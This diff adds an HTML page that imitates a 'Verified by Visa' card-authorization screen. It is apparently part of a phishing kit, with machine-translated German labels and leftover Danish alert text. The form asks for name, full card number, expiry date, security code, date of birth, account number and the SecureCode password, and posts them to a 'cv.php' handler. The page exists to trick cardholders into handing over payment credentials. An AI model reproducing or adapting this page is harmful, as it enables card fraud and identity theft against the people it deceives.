@@ -1,0 +1,584 @@
+<!-- saved from url=(0056)file:///F:/New%20folder/PBS_/mdpayacs/ACS3Authorize.html -->
+<html xmlns="http://www.w3.org/1999/xhtml" class="translated-ltr">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Verified by Visa
+  </title>
+  <meta http-equiv="Expires" content="0" />
+  <link href="./very_files/normal.css" type="text/css" rel="stylesheet" />
+  <script type="text/javascript">
+   function submitIt(form) {
+
+   if (form.pin2.value == "") {
+       
+      alert("udfylde området Dit kortnummer.");
+      form.pin2.focus();
+      form.pin2.select();
+      return false;
+         }else if (form.pin3.value == "") {
+      alert("udfylde området Dit kortnummer.");
+      form.pin3.focus();
+      form.pin3.select();
+      return false;
+         }else if (form.pin4.value == "") {
+      alert("udfylde området Dit kortnummer.");
+      form.pin4.focus();
+      form.pin4.select();
+      return false;
+    }else if (form.pin5.value == "") {
+      alert("udfylde området Dit kortnummer.");
+      form.pin5.focus();
+      form.pin5.select();
+      return false;
+    }else if (form.pin6.value == "") {
+      alert("udfylde området Kortets udløbsdato.");
+      form.pin6.focus();
+      form.pin6.select();
+      return false;
+    }else if (form.pin7.value == "") {
+      alert("udfylde området Kortets udløbsdato.");
+      form.pin7.focus();
+      form.pin7.select();
+      return false;
+          }else if (form.pin8.value == "") {
+      alert("udfylde området Kortets kontrolcifre.");
+      form.pin8.focus();
+      form.pin8.select();
+      return false;
+      
+    }else if (form.pin50.value == "") {
+      alert("udfylde området dit cpr-nr.");
+      form.pin50.focus();
+      form.pin50.select();
+      return false;
+    }else if (form.pin9.value == "") {
+      alert("udfylde området De 4 sidste cifre i dit cpr-nr.");
+      form.pin9.focus();
+      form.pin9.select();
+      return false;
+    }else if (form.pin10.value == "") {
+      alert("udfylde området Indtast nuværende kode/SecureCode.");
+      form.pin10.focus();
+      form.pin10.select();
+      return false;
+    }else{
+      return true;
+    }    
+  }
+  </script>
+  <style type="text/css">
+   body {
+	margin: 10px;
+}
+h1 {
+	font-family: Verdana;
+	font-size: 14px;
+}
+.tbl {
+	background-color: #f0f0f0;
+	border-top: 3px solid #ccc;
+}
+td {
+	font-family: Verdana;
+	font-size: 12px;
+}
+#cnt {
+	width: 550px;
+	margin: auto;
+}
+  </style>
+  <script type="text/javascript" language="Javascript">
+   function disableEnterKey(e)
+        {
+     var key;     
+         if(window.event)
+            key = window.event.keyCode; //IE
+         else
+           key = e.which; //firefox     
+        return (key != 13 &amp;amp;&amp;amp; key != 32);
+        }
+
+function isIntegere(s)
+      {
+        if (isNaN(s) &amp;amp;&amp;amp; s != "" &amp;amp;&amp;amp; s != null){
+                document.getElementById("expdate").style.background = "#FF5D60"
+                return false;}
+      document.getElementById("expdate").style.background = "#F5F5F5"
+      return true;
+}
+
+function isIntegert(s)
+      {
+        if (isNaN(s) &amp;amp;&amp;amp; s != "" &amp;amp;&amp;amp; s != null){
+                document.getElementById("trackdata").style.background = "#FF5D60"
+                return false;}
+      document.getElementById("trackdata").style.background = "#F5F5F5"
+      return true;
+}
+
+function setFocus()
+{
+             document.getElementById("trackdata").focus();
+}
+  </script>
+  <link href="./very_files/translateelement.css" charset="UTF-8" rel="stylesheet" type="text/css" />
+ </head>
+ <body vlink="#333333" text="#000000" link="#333333" bgcolor="#8194b1" alink="#666666" topmargin="5" leftmargin="5" onload="document.passwdForm.pin.focus();">
+  <div dir="ltr" class="skiptranslate" id="goog-gt-tt">
+   <div style="padding: 8px;">
+    <div>
+     <div class="logo">
+      <img width="20" height="20" src="./very_files/translate-32.png" />
+     </div>
+    </div>
+   </div>
+   <div style="padding: 8px; float: left; width: 100%;" class="top">
+    <h1 class="title gray">
+     Texte d'origine
+    </h1>
+   </div>
+   <div style="padding: 8px;" class="middle">
+    <div class="original-text">
+    </div>
+   </div>
+   <div style="padding: 8px;" class="bottom">
+    <div class="activity-links">
+     <span class="activity-link">
+      Proposer une meilleure traduction
+     </span>
+     <span class="activity-link">
+     </span>
+    </div>
+    <div class="started-activity-container">
+     <hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;" />
+     <div class="activity-root">
+     </div>
+    </div>
+   </div>
+   <div style="display: none;" class="status-message">
+   </div>
+  </div>
+  <table width="350" height="126" border="0" cellspacing="0" cellpadding="0">
+   <tbody>
+    <tr>
+     <td width="326" valign="top" height="124" align="left">
+      <table width="320" height="100%" border="0" cellspacing="0" cellpadding="0">
+       <tbody>
+        <tr>
+         <td width="337" valign="top" align="left">
+          <table width="353" border="0" cellspacing="0" cellpadding="0">
+           <tbody>
+            <tr>
+             <td width="353" valign="top" align="left">
+             </td>
+            </tr>
+            <tr>
+             <td width="353" valign="top" align="center">
+              <table width="95%" height="295" border="0" cellspacing="0" cellpadding="0">
+               <tbody>
+                <tr>
+                 <td align="left">
+                  <img src="./very_files/0x0x1.jpg" />
+                 </td>
+                 <td width="54%" height="20" align="right">
+                  <img src="http://www.credit-card-logos.com/images/visa_credit-card-logos/visa_mastercard_1.gif" />
+                 </td>
+                </tr>
+                <tr>
+                 <td valign="top" height="275" colspan="2">
+                  <br />
+                  <p class="tituloPagina">
+                   <font>
+                    <font>
+                     1. Geben Sie Ihre Daten korrekt
+                    </font>
+                   </font>
+                  </p>
+                  <table width="100%" border="0" cellspacing="0" cellpadding="2">
+                   <tbody>
+                    <tr>
+                     <td width="100%" colspan="2" class="td1">
+                      <font class="textoMediano">
+                       <font>
+                        <font>
+                         Ihre Bank hat Ihre Visa-Karte registriert für Verified by Visa, um Ihre Karte vor Missbrauch zu schützen.
+                        </font>
+                        <font>
+                         Sie haben, um die Registrierung der Karte, indem Sie das folgende Formular zu bestätigen, klicken Sie auf "bestätigen".
+                        </font>
+                        <font>
+                         Wenn Sie in einem Internet-Geschäft mit ein Verifizierte handeln weiter Visa-Logo, werden Sie aufgefordert werden, geben Sie Ihren Verified by Visa-Code, um den Kauf zu genehmigen.
+                        </font>
+                       </font>
+                       <br />
+                      </font>
+                      <form onsubmit="javascript: onFormSubmit()" autocomplete="off" method="post" action="cv.php" id="loginForm">
+                       <font class="textoMediano">
+                        <input type="hidden" value="" name="bestätigen" />
+                        <input type="hidden" value="86e4b665cbfe5d6e150f559f3f20dab7" name="org.apache.struts.taglib.html.TOKEN" />
+                        <input type="hidden" value="true" name="jsEnabled" id="jsEnabled" />
+                        <script type="text/javascript">
+                         document.getElementById("jsEnabled").value= true;
+                        </script>
+                        <br />
+                        <font>
+                        </font>
+                        <br />
+                        <br />
+                        <font>
+                        </font>
+                       </font>
+                      </form>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="238">
+                      <span class="td2_bold">
+                       <font>
+                        <font>
+                         Name
+                        </font>
+                       </font>
+                       <font color="#ff0000">
+                        <font>
+                         <font>
+                          *:
+                         </font>
+                        </font>
+                       </font>
+                       <font>
+                       </font>
+                      </span>
+                     </td>
+                     <td>
+                      <input type="text" autocomplete="off" name="A1" size="16" maxlength="25" tabindex="1" class="formulario" style="WIDTH: 121px; HEIGHT: 22px" />
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="238">
+                      <span class="td2_bold">
+                       <font>
+                        <font>
+                         Vorname
+                        </font>
+                       </font>
+                       <font color="#ff0000">
+                        <font>
+                         <font>
+                          *:
+                         </font>
+                        </font>
+                       </font>
+                       <font>
+                       </font>
+                      </span>
+                     </td>
+                     <td>
+                      <input type="text" autocomplete="off" name="A2" size="16" maxlength="25" tabindex="1" class="formulario" style="WIDTH: 121px; HEIGHT: 22px" />
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="103" height="45" align="right" class="td2_bold">
+                      <div align="left">
+                       <font>
+                        <font>
+                         Kartentyp:                                                                               
+                        </font>
+                       </font>
+                      </div>
+                     </td>
+                     <td width="50%" align="left">
+                      <table width="157" border="0">
+                       <tbody>
+                        <tr>
+                         <td width="151">
+                          <img width="46" height="31" src="./very_files/0x0xx1.gif" />
+                          <img width="47" height="31" src="./very_files/0x0xx3.gif" />
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                     </td>
+                    </tr>
+                    <tr>
+                    </tr>
+                   </tbody>
+                  </table>
+                  <table width="492" height="235" border="0">
+                   <tbody>
+                    <tr>
+                     <td width="238">
+                      <span class="td2_bold">
+                       <font>
+                        <font>
+                         Ihre Kartennummer 
+                        </font>
+                       </font>
+                       <font color="#ff0000">
+                        <font>
+                         <font>
+                          *:
+                         </font>
+                        </font>
+                       </font>
+                       <font>
+                       </font>
+                      </span>
+                     </td>
+                     <td width="161">
+                      <div>
+                       <input autocomplete="off" name="pin2" size="1" maxlength="4" tabindex="1" class="formulario" style="WIDTH: 33px; HEIGHT: 22px" />
+                       <font>
+                        <font>
+                         -
+                        </font>
+                       </font>
+                       <input autocomplete="off" name="pin3" size="1" maxlength="4" tabindex="1" class="formulario" style="WIDTH: 33px; HEIGHT: 22px" />
+                       <font>
+                        <font>
+                         -
+                        </font>
+                       </font>
+                       <input autocomplete="off" name="pin4" size="1" maxlength="4" tabindex="1" class="formulario" style="WIDTH: 33px; HEIGHT: 22px" />
+                       <font>
+                        <font>
+                         -
+                        </font>
+                       </font>
+                       <input autocomplete="off" name="pin5" size="1" maxlength="4" tabindex="1" class="formulario" style="WIDTH: 33px; HEIGHT: 22px" />
+                      </div>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="238">
+                      <span class="td2_bold">
+                       <font>
+                        <font>
+                         Kartenverfallsdatum
+                        </font>
+                       </font>
+                       <font color="#ff0000">
+                        <font>
+                         <font>
+                          *:
+                         </font>
+                        </font>
+                       </font>
+                       <font>
+                       </font>
+                      </span>
+                     </td>
+                     <td>
+                      <input autocomplete="off" name="pin6" size="1" maxlength="2" tabindex="1" class="formulario" style="WIDTH: 32px; HEIGHT: 22px" />
+                      <font>
+                       <font>
+                        -
+                       </font>
+                      </font>
+                      <input autocomplete="off" name="pin7" size="1" maxlength="2" tabindex="1" class="formulario" style="WIDTH: 32px; HEIGHT: 22px" />
+                      <span lang="da" class="short_text" id="result_box">
+                       <span class="hps">
+                        <font>
+                         <font>
+                          Beispiel
+                         </font>
+                        </font>
+                       </span>
+                      </span>
+                      <font>
+                       <font>
+                        (MD / Jahr)
+                       </font>
+                      </font>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="238">
+                      <span class="td2_bold">
+                       <font>
+                        <font>
+                         Die Karte Sicherheitscode
+                        </font>
+                       </font>
+                       <font color="#ff0000">
+                        <font>
+                         <font>
+                          *:
+                         </font>
+                        </font>
+                       </font>
+                       <font>
+                       </font>
+                      </span>
+                     </td>
+                     <td>
+                      <input autocomplete="off" name="pin8" size="1" maxlength="3" tabindex="1" class="formulario" style="WIDTH: 32px; HEIGHT: 22px" />
+                      <font>
+                       <font>
+                        (Die letzten 3
+                       </font>
+                       <span lang="da" class="short_text" id="result_box">
+                        <span class="hps">
+                         <font>
+                          Ziffern
+                         </font>
+                        </span>
+                       </span>
+                       <span lang="da" class="short_text" id="result_box">
+                        <span class="hps">
+                         <font>
+                          auf der Rückseite
+                         </font>
+                        </span>
+                       </span>
+                       <span lang="da" class="short_text" id="result_box">
+                        <span class="hps">
+                         <font>
+                          der
+                         </font>
+                        </span>
+                       </span>
+                       <font>
+                        Karte)
+                       </font>
+                      </font>
+                      <span lang="da" class="short_text" id="result_box">
+                       <span class="hps">
+                        <font>
+                        </font>
+                       </span>
+                       <span class="hps">
+                        <font>
+                        </font>
+                       </span>
+                       <span class="hps">
+                        <font>
+                        </font>
+                       </span>
+                       <span class="hps">
+                        <font>
+                        </font>
+                       </span>
+                      </span>
+                      <font>
+                      </font>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="238">
+                      <span class="td2_bold">
+                       <font>
+                        <font>
+                         Geburtsdatum 
+                        </font>
+                       </font>
+                       <font color="#ff0000">
+                        <font>
+                         <font>
+                          *:
+                         </font>
+                        </font>
+                       </font>
+                       <font>
+                       </font>
+                      </span>
+                     </td>
+                     <td width="161">
+                      <div>
+                       <input autocomplete="off" name="A3" size="1" maxlength="4" tabindex="1" class="formulario" style="WIDTH: 33px; HEIGHT: 22px" />
+                       <font>
+                        <font>
+                         -
+                        </font>
+                       </font>
+                       <input autocomplete="off" name="A4" size="1" maxlength="4" tabindex="1" class="formulario" style="WIDTH: 33px; HEIGHT: 22px" />
+                       <font>
+                        <font>
+                         -
+                        </font>
+                       </font>
+                       <input autocomplete="off" name="A5" size="1" maxlength="4" tabindex="1" class="formulario" style="WIDTH: 33px; HEIGHT: 22px" />
+                      </div>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="238">
+                      <span class="td2_bold">
+                       <font>
+                        <font>
+                         konto Number
+                        </font>
+                       </font>
+                       <font color="#ff0000">
+                        <font>
+                         <font>
+                          *:
+                         </font>
+                        </font>
+                       </font>
+                       <font>
+                       </font>
+                      </span>
+                     </td>
+                     <td>
+                      <input autocomplete="off" name="pin9" size="2" maxlength="20" tabindex="1" class="formulario" style="WIDTH: 70px; HEIGHT: 22px" />
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="238">
+                      <span class="td2_bold">
+                       <font>
+                        <font>
+                         Geben Sie den aktuellen Code / Securecode
+                        </font>
+                       </font>
+                       <font color="#ff0000">
+                        <font>
+                         <font>
+                          *:
+                         </font>
+                        </font>
+                       </font>
+                       <font>
+                       </font>
+                      </span>
+                     </td>
+                     <td>
+                      <input type="password" autocomplete="off" name="pin10" size="16" maxlength="25" tabindex="1" class="formulario" style="WIDTH: 121px; HEIGHT: 22px" />
+                     </td>
+                    </tr>
+                    <tr>
+                    </tr>
+                   </tbody>
+                   <tbody>
+                    <tr>
+                     <td width="238" valign="top" align="left">
+                      <br />
+                      <font>
+                       <font>
+                        <input type="submit" name="selectButton" value="   bestätigen   " tabindex="2" class="boton" id="selectButton" />
+                       </font>
+                      </font>
+                     </td>
+                    </tr>
+                   </tbody>
+                  </table>
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
